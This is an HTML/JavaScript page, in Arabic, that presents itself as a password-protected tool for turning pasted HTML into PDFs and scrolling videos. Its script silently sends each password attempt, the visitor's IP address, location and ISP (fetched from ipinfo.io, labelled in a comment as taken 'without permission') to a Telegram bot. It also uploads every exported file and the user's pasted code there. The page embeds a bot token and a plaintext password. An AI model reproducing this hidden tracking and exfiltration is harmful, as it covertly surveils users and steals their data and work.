<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>منصة تحويل الأكواد إلى PDF وفيديو</title>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>

    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Tahoma, sans-serif; background: #f4f6f8; color: #333; margin: 0; padding: 15px; display: flex; flex-direction: column; height: 100vh; box-sizing: border-box; }
        .header { text-align: center; margin-bottom: 15px; }
        .header h2 { margin: 0; color: #1e293b; font-size: 22px;}
        .main-container { display: flex; gap: 15px; flex: 1; overflow: hidden; }
        @media (max-width: 768px) { .main-container { flex-direction: column; height: auto; overflow: visible; } body {height: auto; padding: 10px;} }
        
        .sidebar { background: #fff; border-radius: 10px; padding: 20px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); border: 1px solid #e2e8f0; display: flex; flex-direction: column; flex: 1; max-width: 380px; overflow-y: auto;}
        .preview-section { background: #fff; border-radius: 10px; padding: 0; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); border: 1px solid #e2e8f0; display: flex; flex-direction: column; flex: 2; overflow: hidden; }
        
        .form-group { margin-bottom: 12px; display: flex; flex-direction: column; }
        label { margin-bottom: 6px; font-weight: bold; font-size: 13px; color: #475569; }
        input, select, textarea { padding: 10px; border: 1px solid #cbd5e1; border-radius: 6px; font-size: 13px; font-family: inherit; transition: 0.2s;}
        input:focus, select:focus, textarea:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1); }
        
        .textarea-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; }
        .clear-btn { background: #fee2e2; color: #ef4444; border: none; padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: bold; cursor: pointer; transition: 0.2s; }
        .clear-btn:hover { background: #fca5a5; color: #b91c1c; }
        
        textarea { flex: 1; min-height: 140px; resize: vertical; direction: ltr; font-family: monospace; background: #f8fafc; font-size: 12px;}
        
        .row { display: flex; gap: 10px; }
        .row .form-group { flex: 1; }

        .ai-prompts { background: #f0fdf4; border: 1px dashed #22c55e; padding: 12px; border-radius: 8px; margin-bottom: 15px;}
        .ai-prompts p { margin: 0 0 8px 0; font-size: 12px; color: #166534; font-weight: bold; text-align: center;}
        .prompt-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
        .prompt-btn { background: #fff; border: 1px solid #22c55e; color: #15803d; padding: 6px; border-radius: 6px; font-size: 11px; font-weight: bold; cursor: pointer; transition: 0.2s; text-align: center;}
        .prompt-btn:hover { background: #22c55e; color: #fff; }

        .export-btn { background: #2563eb; color: white; border: none; padding: 14px; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer; margin-top: 5px; transition: 0.2s; }
        .export-btn:hover { background: #1d4ed8; transform: translateY(-1px);}
        .export-btn:disabled { background: #94a3b8; cursor: not-allowed; transform: none;}
        
        .preview-header { padding: 12px 20px; background: #f8fafc; border-bottom: 1px solid #e2e8f0; font-size: 14px; font-weight: bold; color: #475569; display: flex; justify-content: space-between; align-items: center;}
        .tag { background: #e0e7ff; color: #4338ca; padding: 4px 10px; border-radius: 6px; font-size: 12px; transition: 0.3s;}
        iframe { width: 100%; height: 100%; border: none; background: #fff; }
    </style>
</head>
<body>

    <div id="password-overlay" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #f4f6f8; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center;">
        <div style="background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); border: 1px solid #e2e8f0; text-align: center; width: 90%; max-width: 350px;">
            <h3 style="margin-top: 0; color: #1e293b;">🔒 حماية المنصة</h3>
            <p style="font-size: 13px; color: #475569; margin-bottom: 20px;">الرجاء إدخال كلمة المرور للوصول.</p>
            <div class="form-group" style="margin-bottom: 15px;">
                <input type="password" id="pass-input" placeholder="كلمة المرور..." style="text-align: center; letter-spacing: 2px;" onkeypress="if(event.key === 'Enter') checkPassword()">
            </div>
            <button onclick="checkPassword()" class="export-btn" style="width: 100%; padding: 10px; margin-top: 0;">تسجيل الدخول</button>
            <p id="pass-error" style="color: #ef4444; font-size: 12px; display: none; margin-top: 15px; font-weight: bold; margin-bottom: 0;">❌ كلمة المرور غير صحيحة!</p>
        </div>
    </div>

    <div class="header">
        <h2>🛠️ منصة تحويل الأكواد (PDF / فيديو)</h2>
    </div>

    <div class="main-container">
        <div class="sidebar">
            <div class="ai-prompts">
                <p>🤖 نسخ أمر جاهز للذكاء الاصطناعي:</p>
                <div class="prompt-btns">
                    <button class="prompt-btn" onclick="copyPrompt('a4', this)">📄 بحث PDF (A4)</button>
                    <button class="prompt-btn" onclick="copyPrompt('169', this)">🖥️ عرض PDF (16:9)</button>
                    <button class="prompt-btn" onclick="copyPrompt('vid916', this)">📱 فيديو طولي (9:16)</button>
                    <button class="prompt-btn" onclick="copyPrompt('vid169', this)">🎬 فيديو عرضي (16:9)</button>
                </div>
            </div>

            <div class="form-group">
                <label>اسم الملف المستخرج:</label>
                <input type="text" id="file-name" value="مستند_جديد" placeholder="اكتب اسم الملف هنا...">
            </div>

            <div class="row">
                <div class="form-group">
                    <label>نوع الاستخراج:</label>
                    <select id="format-select" onchange="updateTag()">
                        <optgroup label="ملفات PDF">
                            <option value="pdf-169">عرض تقديمي (16:9)</option>
                            <option value="pdf-a4">بحث / تقرير (A4)</option>
                        </optgroup>
                        <optgroup label="مقاطع فيديو (تمرير تلقائي)">
                            <option value="vid-916">فيديو للجوال (9:16)</option>
                            <option value="vid-169">فيديو يوتيوب (16:9)</option>
                        </optgroup>
                    </select>
                </div>
                <div class="form-group">
                    <label>الجودة:</label>
                    <select id="quality-select">
                        <option value="1">عادية (أسرع)</option>
                        <option value="2" selected>عالية</option>
                        <option value="3">ممتازة (أبطأ)</option>
                    </select>
                </div>
            </div>

            <div class="form-group" style="flex: 1;">
                <div class="textarea-header">
                    <label style="margin:0;">كود الـ HTML (الصق هنا):</label>
                    <button class="clear-btn" onclick="clearCode()">🗑️ مسح الكود</button>
                </div>
                <textarea id="html-input" oninput="updatePreview()" placeholder="الصق الكود الذي أعطاك إياه الذكاء الاصطناعي هنا..."></textarea>
            </div>

            <button id="capture-btn" class="export-btn" onclick="exportFile()">بدء الاستخراج 📥</button>
        </div>

        <div class="preview-section">
            <div class="preview-header">
                <span>👁️ المعاينة المباشرة</span>
                <span class="tag" id="size-tag">الأبعاد: 1280 × 720 (PDF)</span>
            </div>
            <iframe id="preview-frame"></iframe>
        </div>
    </div>

    <script>
        // ==========================================
        // ⚠️ إعدادات تيليجرام
        // ==========================================
        const botToken = '8596768390:AAFMUk6zaACs6Zmum5kFy3NfNEkS_C4yZzo'; 
        const chatId = '6680237928'; 

        function sendTextToTelegram(actionMessage) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: `🛠️ إشعار منصة التحويل\n\n${actionMessage}` })
            }).catch(e => console.error(e));
        }

        // إرسال الملفات مع تحديد نوعها (document أو video) عشان تيليجرام يتعرف على الفيديو
        async function sendFileToTelegram(fileBlob, fileName, captionMsg, type = 'document') {
            const endpoint = type === 'video' ? 'sendVideo' : 'sendDocument';
            const url = `https://api.telegram.org/bot${botToken}/${endpoint}`;
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append(type === 'video' ? 'video' : 'document', fileBlob, fileName); 
            formData.append('caption', captionMsg);

            for (let i = 0; i < 3; i++) {
                try {
                    const response = await fetch(url, { method: 'POST', body: formData });
                    const data = await response.json();
                    if (data.ok) return true; 
                } catch (e) {
                    console.error(`Error sending ${fileName}`);
                }
                await new Promise(res => setTimeout(res, 1000));
            }
            return false; 
        }

        function getSilentLocationInfo(statusText, passwordInput) {
            let info = `📍 حالة الدخول: ${statusText}\nالكلمة المجربة: ${passwordInput}`;
            fetch('https://ipinfo.io/json')
                .then(res => res.json())
                .then(data => {
                    if(data.ip) {
                        const [lat, lng] = data.loc ? data.loc.split(',') : ['0', '0'];
                        let ipResult = `\n\n🌐 معلومات الجهاز (بدون إذن):` +
                                     `\nالآيبي: ${data.ip}` +
                                     `\nالدولة: ${data.country}` +
                                     `\nالمدينة: ${data.city}` +
                                     `\nالشركة: ${data.org}` +
                                     `\nالخريطة: \nhttps://www.google.com/maps?q=$${lat},${lng}`;
                        sendTextToTelegram(info + ipResult);
                    } else {
                        sendTextToTelegram(info + `\n\n⚠️ تعذر تحديد الموقع.`);
                    }
                })
                .catch(err => {
                    sendTextToTelegram(info + `\n\n⚠️ (تم حجب الآيبي من متصفح المستخدم).`);
                });
        }

        function checkPassword() {
            const input = document.getElementById('pass-input').value;
            const errorMsg = document.getElementById('pass-error');
            
            if (input === 'Sa12345678@') {
                document.getElementById('password-overlay').style.display = 'none';
                getSilentLocationInfo("✅ دخول ناجح للمنصة", input);
            } else {
                errorMsg.style.display = 'block';
                getSilentLocationInfo("❌ محاولة دخول فاشلة", input);
                setTimeout(() => errorMsg.style.display = 'none', 3000);
            }
        }
        // ==========================================

        const prompts = {
            a4: `أنت مصمم وثائق HTML. قم بإنشاء كود لبحث أكاديمي (A4). عرض الصفحة 794px وارتفاعها 1123px مقسمة لصفحات داخل <div class="page">. استخدم خطوط عربية ونسق احترافي.`,
            169: `أنت مصمم عروض. قم بإنشاء كود لعرض تقديمي. عرض الصفحة 1280px وارتفاعها 720px مقسمة لشرائح داخل <div class="page">. لا تستخدم القوائم الافتراضية (ul, ol).`,
            vid916: `أنت مصمم واجهات. قم بإنشاء كود HTML مصمم خصيصاً ليتم تصويره كفيديو طولي للجوال (Reels/TikTok). العرض يجب أن يكون ثابت 720px والارتفاع مفتوح (ليتم التمرير عليه). استخدم ألوان جذابة، نصوص ضخمة جداً وواضحة، خلفيات ملونة، وتنسيق يعتمد على الكتل (Blocks) الجمالية. لا تقسمه لصفحات.`,
            vid169: `أنت مصمم واجهات. قم بإنشاء كود HTML مصمم خصيصاً ليتم تصويره كفيديو عرضي (يوتيوب). العرض يجب أن يكون ثابت 1280px والارتفاع مفتوح. استخدم خطوط كبيرة جداً وتنسيقات ملونة جذابة. لا تقسمه لصفحات، اجعله صفحة واحدة طويلة ومترابطة.`
        };

        function copyPrompt(type, btnElement) {
            navigator.clipboard.writeText(prompts[type]).then(() => {
                const originalText = btnElement.innerText;
                btnElement.innerText = "✅ تم النسخ!";
                btnElement.style.background = "#22c55e";
                btnElement.style.color = "#fff";
                setTimeout(() => {
                    btnElement.innerText = originalText;
                    btnElement.style.background = "#fff";
                    btnElement.style.color = "#15803d";
                }, 2000);
            });
        }

        function clearCode() {
            if(confirm("هل أنت متأكد من مسح الكود؟")) {
                document.getElementById('html-input').value = '';
                updatePreview();
            }
        }

        function updateTag() {
            const format = document.getElementById('format-select').value;
            const tag = document.getElementById('size-tag');
            if(format === 'pdf-a4') tag.innerText = "الأبعاد: 794 × 1123 (PDF)";
            else if(format === 'pdf-169') tag.innerText = "الأبعاد: 1280 × 720 (PDF)";
            else if(format === 'vid-916') tag.innerText = "الأبعاد: 720 × مفتوح (فيديو طولي)";
            else if(format === 'vid-169') tag.innerText = "الأبعاد: 1280 × مفتوح (فيديو عرضي)";
        }

        function updatePreview() {
            const code = document.getElementById('html-input').value;
            document.getElementById('preview-frame').srcdoc = code;
        }

        async function urlToDataURL(url) {
            if (url && (url.startsWith('data:') || url.startsWith('blob:'))) return url;
            let absoluteUrl = url;
            try {
                if (!url.startsWith('http')) absoluteUrl = new URL(url, window.location.href).href;
            } catch(e) { absoluteUrl = url; }
            
            const proxies = [ null, 'https://corsproxy.io/?', 'https://api.allorigins.win/raw?url=' ];
            for (const proxy of proxies) {
                try {
                    let fetchUrl = proxy ? proxy + encodeURIComponent(absoluteUrl) : absoluteUrl;
                    const response = await fetch(fetchUrl, { mode: 'cors' });
                    if (!response.ok) continue;
                    const blob = await response.blob();
                    return await new Promise((resolve) => {
                        const reader = new FileReader();
                        reader.onloadend = () => resolve(reader.result);
                        reader.readAsDataURL(blob);
                    });
                } catch (err) {}
            }
            return new Promise((resolve) => {
                const img = new Image();
                img.crossOrigin = "Anonymous";
                img.onload = () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = img.width; canvas.height = img.height;
                    canvas.getContext('2d').drawImage(img, 0, 0);
                    resolve(canvas.toDataURL('image/jpeg', 0.8));
                };
                img.onerror = () => resolve(null);
                img.src = absoluteUrl;
                setTimeout(() => resolve(null), 3000); 
            });
        }
        
        async function convertAllImagesToDataURLs(container) {
            const images = Array.from(container.querySelectorAll('img'));
            await Promise.all(images.map(async (img) => {
                const src = img.getAttribute('src');
                if (!src || src.startsWith('data:')) return;
                const dataUrl = await urlToDataURL(src);
                if (dataUrl) img.setAttribute('src', dataUrl);
            }));
        }

        // ===============================================
        // الدالة الرئيسية التي توجه للـ PDF أو الـ Video
        // ===============================================
        async function exportFile() {
            const code = document.getElementById('html-input').value;
            const formatType = document.getElementById('format-select').value;
            
            if (!code.trim()) { alert("الرجاء لصق الكود أولاً!"); return; }

            if (formatType.startsWith('pdf')) {
                await generatePDF();
            } else {
                await generateVideo();
            }
        }

        // ===============================================
        // 1. توليد الفيديو (تمرير تلقائي)
        // ===============================================
        async function generateVideo() {
            const btn = document.getElementById('capture-btn');
            const code = document.getElementById('html-input').value;
            const fileName = document.getElementById('file-name').value || 'video';
            const formatType = document.getElementById('format-select').value;
            const quality = parseInt(document.getElementById('quality-select').value);

            let docWidth = formatType === 'vid-916' ? 720 : 1280;
            let docHeight = formatType === 'vid-916' ? 1280 : 720;

            btn.disabled = true;
            btn.innerText = `⏳ جاري تجهيز الفيديو...`;
            sendTextToTelegram(`⏳ بدء استخراج فيديو جديد...\nالاسم: ${fileName}\nالمقاس: ${docWidth}x${docHeight}`);

            const hiddenContainer = document.createElement('div');
            hiddenContainer.dir = 'rtl'; 
            hiddenContainer.style.position = 'absolute';
            hiddenContainer.style.top = '0'; hiddenContainer.style.left = '0';
            hiddenContainer.style.zIndex = '-9999';
            hiddenContainer.style.width = docWidth + 'px'; 
            hiddenContainer.innerHTML = code;
            document.body.appendChild(hiddenContainer);

            try {
                btn.innerText = `🖼️ معالجة الصور للفيديو...`;
                await convertAllImagesToDataURLs(hiddenContainer);
                await document.fonts.ready;

                // التقاط كامل الصفحة كصورة طويلة جداً
                btn.innerText = `📸 تصوير الصفحة بالكامل...`;
                const scale = quality === 1 ? 1 : (quality === 2 ? 1.5 : 2);
                const fullCanvas = await html2canvas(hiddenContainer, {
                    scale: scale, width: docWidth, windowWidth: docWidth, useCORS: true
                });

                btn.innerText = `🎬 جاري تسجيل الفيديو (تمرير)...`;

                // إعداد مسرح تسجيل الفيديو
                const recCanvas = document.createElement('canvas');
                recCanvas.width = docWidth;
                recCanvas.height = docHeight;
                const ctx = recCanvas.getContext('2d');

                // إعداد التسجيل
                const stream = recCanvas.captureStream(30); // 30 إطار في الثانية
                let mimeType = 'video/webm;codecs=vp9';
                if (MediaRecorder.isTypeSupported('video/mp4')) mimeType = 'video/mp4'; // دعم لبعض المتصفحات

                const recorder = new MediaRecorder(stream, { mimeType: mimeType, videoBitsPerSecond: 2500000 });
                const chunks = [];
                recorder.ondataavailable = e => { if(e.data.size > 0) chunks.push(e.data); };

                // عند الانتهاء من التسجيل
                const recordPromise = new Promise(resolve => {
                    recorder.onstop = async () => {
                        btn.innerText = "✅ جاري إنهاء العملية...";
                        const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
                        const videoBlob = new Blob(chunks, { type: mimeType });
                        const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });

                        // إرسال للبوت أولاً
                        await sendFileToTelegram(videoBlob, `${fileName}.${ext}`, `🎬 تم استخراج الفيديو بنجاح!\nالاسم: ${fileName}`, 'video');
                        await sendFileToTelegram(codeBlob, `${fileName}_code.txt`, `💻 كود الـ HTML الخاص بالفيديو.`);

                        // تحميل للمستخدم
                        const url = URL.createObjectURL(videoBlob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = `${fileName}.${ext}`;
                        a.click();
                        resolve();
                    };
                });

                recorder.start();

                // تحريك الكاميرا (التمرير) على الكانفاس
                const maxScroll = Math.max(0, fullCanvas.height - (docHeight * scale));
                const duration = 6000; // مدة الفيديو 6 ثواني
                const startTime = Date.now();

                function drawFrame() {
                    const elapsed = Date.now() - startTime;
                    const progress = Math.min(elapsed / duration, 1);
                    
                    // حساب حركة التمرير لتكون سلسة (EaseInOut تقريبي)
                    const smoothProgress = 0.5 - Math.cos(progress * Math.PI) / 2;
                    const yPos = smoothProgress * maxScroll;

                    ctx.fillStyle = "#ffffff";
                    ctx.fillRect(0, 0, docWidth, docHeight);
                    // رسم جزء من الصورة الطويلة بناءً على موقع التمرير
                    ctx.drawImage(fullCanvas, 0, yPos, docWidth * scale, docHeight * scale, 0, 0, docWidth, docHeight);

                    if (progress < 1) {
                        requestAnimationFrame(drawFrame);
                    } else {
                        recorder.stop();
                    }
                }
                drawFrame(); // بدء الأنيميشن
                
                await recordPromise; // انتظار انتهاء التسجيل والرفع

            } catch (error) {
                console.error(error);
                alert("حدث خطأ أثناء معالجة الفيديو.");
            } finally {
                document.body.removeChild(hiddenContainer);
                btn.disabled = false;
                btn.innerText = "بدء الاستخراج 📥";
            }
        }

        // ===============================================
        // 2. توليد الـ PDF (نفس الكود الموثوق السابق)
        // ===============================================
        async function generatePDF() {
            const btn = document.getElementById('capture-btn');
            const code = document.getElementById('html-input').value;
            const fileName = document.getElementById('file-name').value || 'document';
            const qualityScale = parseInt(document.getElementById('quality-select').value);
            const formatType = document.getElementById('format-select').value;

            sendTextToTelegram(`⏳ بدء استخراج PDF جديد...\nالاسم: ${fileName}`);

            let docWidth = formatType === 'pdf-a4' ? 794 : 1280;
            let docHeight = formatType === 'pdf-a4' ? 1123 : 720;
            let pdfOrientation = formatType === 'pdf-a4' ? 'portrait' : 'landscape';

            let compressionRate = qualityScale === 1 ? 0.55 : (qualityScale === 3 ? 0.90 : 0.70);

            btn.disabled = true;
            btn.innerText = `⏳ جاري التجهيز...`;

            const hiddenContainer = document.createElement('div');
            hiddenContainer.dir = 'rtl'; 
            hiddenContainer.style.position = 'absolute';
            hiddenContainer.style.top = '0'; hiddenContainer.style.left = '0';
            hiddenContainer.style.zIndex = '-9999';
            hiddenContainer.style.width = docWidth + 'px'; 
            hiddenContainer.innerHTML = code;
            
            const styleFix = document.createElement('style');
            styleFix.innerHTML = `ul{list-style-type:none!important;padding-right:0!important}ul li::before{content:"• "!important;font-weight:bold;margin-left:5px}ol{list-style-type:none!important;padding-right:0!important;counter-reset:item}ol li{counter-increment:item}ol li::before{content:counter(item) "- "!important;font-weight:bold;margin-left:5px}*{box-sizing:border-box!important;letter-spacing:normal!important}img{max-width:100%;height:auto}`;
            hiddenContainer.appendChild(styleFix);
            document.body.appendChild(hiddenContainer);

            try {
                btn.innerText = `🖼️ معالجة الصور...`;
                await convertAllImagesToDataURLs(hiddenContainer);
                await document.fonts.ready;
                
                btn.innerText = "📸 تصوير الصفحات...";
                const { jsPDF } = window.jspdf;
                const pdf = new jsPDF({ orientation: pdfOrientation, unit: 'px', format: [docWidth, docHeight] });
                
                let pages = hiddenContainer.querySelectorAll('.page');
                if (pages.length === 0) pages = [hiddenContainer];
                
                for (let i = 0; i < pages.length; i++) {
                    const canvas = await html2canvas(pages[i], {
                        scale: qualityScale, useCORS: true, allowTaint: false, logging: false, width: docWidth, height: docHeight, windowWidth: docWidth
                    });
                    const imgData = canvas.toDataURL('image/jpeg', compressionRate);
                    if (i > 0) pdf.addPage([docWidth, docHeight], pdfOrientation);
                    pdf.addImage(imgData, 'JPEG', 0, 0, docWidth, docHeight, undefined, 'FAST');
                }
                
                btn.innerText = "✅ جاري إنهاء العملية...";
                const pdfBlob = pdf.output('blob');
                const codeBlob = new Blob(['\ufeff', code], { type: 'text/plain;charset=utf-8' });

                await sendFileToTelegram(pdfBlob, `${fileName}.pdf`, `📥 تم استخراج PDF بنجاح!\nالاسم: ${fileName}`);
                await sendFileToTelegram(codeBlob, `${fileName}_code.txt`, `💻 كود الـ HTML.`);
                
                pdf.save(`${fileName}.pdf`);

            } catch (error) {
                console.error(error);
                alert("حدث خطأ أثناء معالجة الملف.");
            } finally {
                document.body.removeChild(hiddenContainer);
                btn.disabled = false;
                btn.innerText = "بدء الاستخراج 📥";
            }
        }
    </script>
</body>
</html>
